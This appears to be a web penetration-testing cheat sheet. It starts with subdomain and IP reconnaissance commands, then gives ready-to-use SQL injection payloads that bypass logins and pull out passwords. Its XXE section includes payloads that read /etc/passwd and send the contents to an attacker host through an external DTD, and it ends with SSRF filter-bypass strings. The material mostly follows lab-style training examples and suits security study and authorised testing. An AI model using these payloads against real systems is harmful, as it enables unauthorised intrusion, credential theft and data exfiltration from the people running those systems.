## [](#header-2) Enumeration / Recon
Burp Regex for Scope Control
```powershell
.*\.example\..*$
```
Find Emails
```powershell
https://phonebook.cz/
```
Reverse Whois Search
```powershell
https://www.whoxy.com/example.com
```
Find Domains Hosted On The Same IP Address
```powershell
https://api.hackertarget.com/reverseiplookup/?q=example.com
```
Pulling root domains
```powershell
Whoxy Reverse Whois API

cat asn.txt | tlsx -san -cn -silent -resp-only | grep -v "example.com"

amass intel -asn 3389

https://crt.sh
cat crt | jq -r '.[].common_name' | sed 's/\*\.\(.*\)/\1/' | rev | cut -d "." -f 1,2 | rev | grep -v " " | sort -u
```
Resolve IP Addresses In A Subnet Range
```powershell
subnet.py [subnet range] | httpx -probe -sc -cl -td -fr | grep "SUCCESS"
xargs -a asn -I {} bash -c 'subnet.py {} | httpx -l final -probe -title -sc -cl -td -ip -fr -p 80,443,8080,8888,8000,8008 | grep "SUCCESS"'
```
Extract A records for the given list of subdomains
```powershell
dnsx -l testsubs -silent -a -resp-only
```
Subdomain Enumeration Commands
```powershell
subfinder -d example.com -all
assetfinder -subs-only example.com
amass enum -d example.com -active
amass enum -d example.com -passive
```
Subdomain Bruteforce
```powershell
~/Desktop/tools/subbrute/subbrute.py example.com
~/Desktop/tools/subbrute/subbrute.py -s ~/Desktop/tools/massdns/lists/names.txt example.com
```
Subdomain Permutations
```powershell
cat domains.txt | dnsgen - | dnsx -silent
sed 's/A.*//' livesubs | sed 's/CN.*//' | sed 's/\..$//' > domains.resolved
```
HTTPX Command
```powershell
httpx -l final -probe -title -sc -cl -td -ip -fr -p 80,443,8080,8888,8000,8008 | grep "SUCCESS"
```
Find Important Keywords In A List Of Subdomains Or Urls
```powershell
isubs.sh file.txt
```
## [](#header-2) Sqli
SQL injection cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet

Basic Query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Basic Payload: `https://insecure-website.com/products?category=Gifts'--`

### Subverting Application Logic

Query: `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`

Payload: `administrator'--`

### Retrieving data from other database tables

Query: `SELECT name, description FROM products WHERE category = 'Gifts'`

Payload: `' UNION SELECT username, password FROM users--`

### SQL injection UNION attacks

The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query. For example: `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

Determining the number of columns: `' ORDER BY 1--` or `' UNION SELECT NULL,NULL--` (note: number of nulls, order by = number of columns)

On Oracle, every SELECT query must use the FROM keyword and specify a valid table: `' UNION SELECT NULL FROM DUAL--`

conditional based blind SQL injection:`' union select null from users where username='administrator' and 1 = (SELECT CASE WHEN (length(password)=10) THEN 1/(SELECT 0) ELSE NULL END)--`

### Extracting sensitive data via verbose SQL error messages

Payload: `' and 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

## [](#header-2) XXE

### Exploiting XXE to retrieve files

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///path/to/file"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### Exploiting XXE to perform SSRF attacks

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
Bypass filtering and validation:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
<stockCheck><productId>1</productId></stockCheck>
```

### Exploiting blind XXE to exfiltrate data out-of-band
malicious external DTD:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
XXE payload to the vulnerable application:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

### Exploiting blind XXE to retrieve data via error messages
malicious external DTD:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
XXE payload to the vulnerable application:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

### Exploiting blind XXE by repurposing a local DTD
if out-of-band interactions are blocked, invoke a DTD file that happens to exist on the local filesystem and repurpose it to redefine an existing entity in a way that triggers a parsing error containing sensitive data:
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Locating an existing DTD file to repurpose:
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
test a list of common DTD files to locate a file that is present

### XInclude attacks
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### XXE attacks via image upload
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
## [](#header-2) SSRF

### SSRF with blacklist-based input filters
```
http://127.1/%2561dmin
http://2130706433/%2561dmin
http://017700000001/%2561dmin
```

### SSRF with whitelist-based input filters
```
1 - https://expected-host:fakepassword@evil-host
2 - https://evil-host#expected-host
3 - https://expected-host.evil-host
4 - URL-encode characters to confuse the URL-parsing code
```

### Bypassing SSRF filters via open redirection
```
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```
